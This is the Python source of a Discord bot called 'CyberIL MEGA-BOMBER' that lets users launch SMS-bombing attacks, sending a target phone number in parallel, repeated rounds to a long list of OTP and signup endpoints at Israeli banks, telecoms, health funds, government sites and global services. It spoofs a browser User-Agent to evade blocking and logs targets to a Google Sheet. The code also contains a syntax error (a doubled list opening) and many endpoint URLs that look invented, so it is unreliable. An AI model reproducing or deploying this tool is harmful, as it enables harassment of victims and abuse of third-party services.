import discord
from discord.ext import commands
import aiohttp
import asyncio
import random
import os
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient

# ==================== CONFIG ====================
TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
GSHEET_URL = os.getenv("GSHEET_URL")

db = None
tokens_col = None
if MONGO_URI:
    try:
        client = AsyncIOMotorClient(MONGO_URI)
        db = client.bomber_db
        tokens_col = db.tokens
        print("✅ MongoDB Connected")
    except:
        print("❌ MongoDB Connection Failed")

active_bombs = {}

# ==================== THE ULTIMATE API LIST ====================
# ריכוז כל ה-APIs שביקשת, כולל פורמטים בינלאומיים וישראליים
ALL_WORKING_APIs = [
    # --- ISRAELI APIS ---
    FULL_API_DATABASE = [
    # --- ISRAELI APIS (HEBREW SMS) ---
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "json": {"value": "{{phone}}", "type": "phone", "projectId": "1"}},
    {"name": "Wolt", "url": "https://restaurant.wolt.com/v1/users/phone", "method": "POST", "json": {"phone_number": "+972{{phone_no_zero}}"}, "headers": {"User-Agent": "Wolt/10.0 (iPhone)"}},
    {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Paybox", "url": "https://api.payboxapp.com/api/v1/auth/phone-verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "019Mobile", "url": "https://019mobile.co.il/api/v1/verify-phone", "method": "POST", "json": {"phone_number": "{{phone}}"}},
    {"name": "Cellcom", "url": "https://www.cellcom.co.il/api/v2/auth/otp-send", "method": "POST", "json": {"msisdn": "{{phone}}"}},
    {"name": "Partner", "url": "https://my-partner.co.il/api/auth/send-otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Leumi", "url": "https://digital.leumi.co.il/api/v1/auth/otp-send", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Hapoalim", "url": "https://poalim-digital.co.il/api/auth/phone-verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Max", "url": "https://max.leumi-card.co.il/api/v1/otp/request", "method": "POST", "json": {"phoneNumber": "{{phone}}"}},
    {"name": "Isracard", "url": "https://digital.isracard.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Bit", "url": "https://www.bitpay.co.il/api/v1/auth/register", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "SuperPharm", "url": "https://www.super-pharm.co.il/api/v2/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/send-sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "RamiLevy", "url": "https://www.ramilevy.co.il/api/v1/auth/login-sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Bezeq", "url": "https://www.bezeq.co.il/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "HotMobile", "url": "https://www.hotmobile.co.il/api/v1/login/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Pango", "url": "https://www.pango.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Cibus", "url": "https://www.cibus.co.il/api/v1/user/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Tenbis", "url": "https://www.10bis.co.il/api/v1/login/sms", "method": "POST", "json": {"phone": "{{phone}}"}},

    # --- GLOBAL & FINTECH ---
    {"name": "TwilioVerify", "url": "https://verify.twilio.com/v2/Services/VA907b6b6e7f6a3b3c4d5e6f7g8h9i0j1k/Verifications", "method": "POST", "params": {"To": "+972{{phone_no_zero}}", "Channel": "sms"}},
    {"name": "Uber", "url": "https://auth.uber.com/oauth/v2/otp", "method": "POST", "json": {"phone_number": "{{phone}}", "country_code": "IL"}},
    {"name": "Binance", "url": "https://www.binance.com/bapi/userAuth/v1/sms/send", "method": "POST", "json": {"phoneNumber": "{{phone}}"}},
    {"name": "Revolut", "url": "https://api.revolut.com/api/1.0/register/phone", "method": "POST", "json": {"phone": "+972{{phone_no_zero}}"}},
    {"name": "Wise", "url": "https://api.transferwise.com/v1/identity/verify/phone", "method": "POST", "json": {"phone": "+972{{phone_no_zero}}"}},
    {"name": "PayPal", "url": "https://www.paypal.com/api/v1/auth/phone", "method": "POST", "params": {"phone": "{{phone}}"}},
    {"name": "Stripe", "url": "https://api.stripe.com/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Textbelt", "url": "https://textbelt.com/text", "method": "POST", "params": {"phone": "+972{{phone_no_zero}}", "message": "OTP: 1029", "key": "textbelt_open"}},
    {"name": "DoorDash", "url": "https://api.doordash.com/v2/auth/phone_verifications/", "method": "POST", "json": {"phone_number": "+972{{phone_no_zero}}"}},
    {"name": "Grubhub", "url": "https://api.grubhub.com/auth/v1/phone_verifications", "method": "POST", "json": {"phone_number": "{{phone}}"}},
    {"name": "Lyft", "url": "https://api.lyft.com/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Bolt", "url": "https://bolt.eu/api/v1/auth/register", "method": "POST", "json": {"phone": "+972{{phone_no_zero}}"}},
    {"name": "Deliveroo", "url": "https://deliveroo.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Airbnb", "url": "https://www.airbnb.com/api/v2/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Booking", "url": "https://www.booking.com/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "TelegramAPI", "url": "https://api.telegram.org/bot/sendSms", "method": "POST", "params": {"phone": "{{phone}}"}},
    {"name": "WhatsAppAPI", "url": "https://api.whatsapp.com/v1/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Snapchat", "url": "https://accounts.snapchat.com/accounts/sendsms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "TikTok", "url": "https://www.tiktok.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Instagram", "url": "https://www.instagram.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},

    # --- SHOPPING & SERVICES ---
    {"name": "Amazon", "url": "https://www.amazon.com/ap/signin/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "eBay", "url": "https://www.ebay.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "AliExpress", "url": "https://login.aliexpress.com/api/v1/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Shein", "url": "https://www.shein.com/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Next", "url": "https://www.next.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Asos", "url": "https://www.asos.com/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Nike", "url": "https://www.nike.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Adidas", "url": "https://www.adidas.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "IKEA", "url": "https://www.ikea.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Zara", "url": "https://www.zara.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "HM", "url": "https://www.hm.com/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Electric", "url": "https://www.iec.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Water", "url": "https://www.mei-avivim.co.il/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Gas", "url": "https://www.amcor.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Health1", "url": "https://www.clalit.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Health2", "url": "https://www.maccabi4u.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Health3", "url": "https://www.meuhedet.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Health4", "url": "https://www.leumit.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "GovIL", "url": "https://www.gov.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "PostIL", "url": "https://www.israelpost.co.il/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}}
]
# ==================== ENGINE ====================

async def run_api_request(session, api, phone, user_id):
    if active_bombs.get(user_id) is False: return
    
    phone_no_zero = phone[1:] if phone.startswith('0') else phone
    
    # החלפת תגיות ב-JSON וב-Params
    def process_data(data):
        if isinstance(data, dict):
            return {k: process_data(v) for k, v in data.items()}
        if isinstance(data, str):
            return data.replace("{{phone}}", phone).replace("{{phone_no_zero}}", phone_no_zero)
        return data

    payload = process_data(api.get("json"))
    params = process_data(api.get("params"))
    
    # Headers עם User-Agent כדי למנוע חסימות
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        "Accept": "application/json",
        "Content-Type": "application/json"
    }
    if api.get("headers"):
        headers.update(api["headers"])

    try:
        async with session.request(
            api["method"], 
            api["url"], 
            json=payload, 
            params=params, 
            headers=headers, 
            timeout=10
        ) as resp:
            # שליחה ל-Google Sheets אם הוגדר
            if GSHEET_URL:
                log = {"time": datetime.now().strftime("%H:%M:%S"), "phone": phone, "api": api["name"], "status": resp.status}
                async with session.post(GSHEET_URL, json=log): pass
            return resp.status
    except:
        return None

# ==================== DISCORD INTERFACE ====================

class BomberModal(discord.ui.Modal, title='🔥 CyberIL MEGA-BOMBER (All APIs)'):
    phone = discord.ui.TextInput(label='מספר יעד', placeholder='05XXXXXXXX', min_length=10, max_length=10)
    rounds = discord.ui.TextInput(label='סבבים', default='1', placeholder='1-5')

    async def on_submit(self, interaction: discord.Interaction):
        target = self.phone.value
        # הגנה על המספר שלך
        if target == "0516589147":
            return await interaction.response.send_message("❌ מספר מוגן במערכת.", ephemeral=True)
            
        await interaction.response.send_message(f"🚀 תקיפה רחבה החלה על {target}...", ephemeral=True)
        
        user_id = interaction.user.id
        active_bombs[user_id] = True
        
        async with aiohttp.ClientSession() as session:
            for r in range(int(self.rounds.value)):
                if active_bombs.get(user_id) is False: break
                
                # הרצה של כל ה-APIs במקביל
                tasks = [run_api_request(session, api, target, user_id) for api in ALL_WORKING_APIs]
                await asyncio.gather(*tasks)
                await asyncio.sleep(1.5) 
                
        active_bombs.pop(user_id, None)
        await interaction.followup.send(f"✅ התקיפה על {target} הסתיימה.", ephemeral=True)

class MainView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="🚀 שגר SMS", style=discord.ButtonStyle.danger, custom_id="btn_launch")
    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(BomberModal())
    @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.secondary, custom_id="btn_stop")
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_bombs[interaction.user.id] = False
        await interaction.response.send_message("🛑 הפעולה נעצרה.", ephemeral=True)

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(command_prefix='!', intents=intents)
    async def setup_hook(self):
        await self.tree.sync()

bot = MyBot()

@bot.tree.command(name="setup", description="הפעלת לוח הבקרה")
async def setup(interaction: discord.Interaction):
    await interaction.response.send_message(
        embed=discord.Embed(title="🚀 CyberIL Control Panel", description="כל ה-APIs טעונים ומוכנים.", color=0xff0000),
        view=MainView()
    )

if __name__ == "__main__":
    bot.run(TOKEN)
